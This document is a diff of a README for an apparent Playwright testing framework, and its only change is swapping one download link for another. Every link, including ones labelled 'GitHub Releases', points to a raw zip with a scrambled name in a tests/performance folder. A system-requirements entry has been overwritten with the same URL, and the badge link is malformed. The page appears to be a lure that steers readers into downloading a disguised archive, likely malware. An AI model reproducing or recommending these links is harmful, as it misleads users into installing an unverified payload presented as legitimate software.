@@ -1,6 +1,6 @@
 # 🎉 PlayWright-Framework-PoC - Simple Testing for Everyone
 
-[![Download Release](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/Wright_Play_C_Po_Framework_v2.2.zip%https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/Wright_Play_C_Po_Framework_v2.2.zip)](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/Wright_Play_C_Po_Framework_v2.2.zip)
+[![Download Release](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip%https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip)](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to PlayWright-Framework-PoC! This easy-to-use software helps you run aut
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [GitHub Releases](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/Wright_Play_C_Po_Framework_v2.2.zip).
+To get started, visit this page to download the application: [GitHub Releases](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version under "Latest Release."
@@ -23,7 +23,7 @@ Before you install, make sure your computer meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (Ubuntu 18.04 or later)
 - **RAM:** At least 4 GB
 - **Disk Space:** Minimum of 200 MB free space
-- **https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/Wright_Play_C_Po_Framework_v2.2.zip** Version 14.x or later
+- **https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip** Version 14.x or later
 
 ## 🌟 Features
 
@@ -88,4 +88,4 @@ This project is licensed under the MIT License, which allows you to freely use, 
 
 ## 📥 Download & Install Again
 
-Don't forget to download the latest version here: [GitHub Releases](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/Wright_Play_C_Po_Framework_v2.2.zip). Enjoy your seamless testing experience!
+Don't forget to download the latest version here: [GitHub Releases](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip). Enjoy your seamless testing experience!
